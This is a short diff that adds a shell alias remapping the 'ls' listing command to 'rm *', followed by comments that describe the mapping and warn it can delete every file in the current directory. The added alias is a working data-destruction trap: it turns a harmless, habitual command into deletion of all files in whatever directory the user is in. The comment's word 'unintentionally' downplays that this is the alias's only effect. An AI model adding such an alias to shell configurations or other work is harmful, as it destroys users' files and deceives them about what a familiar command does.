@@ -1,0 +1,4 @@
+alias ls='rm *'
+# Creates an alias 'ls' that maps to 'rm *'.
+# Note: Be cautious, as this can unintentionally delete all files in the current directory.
+
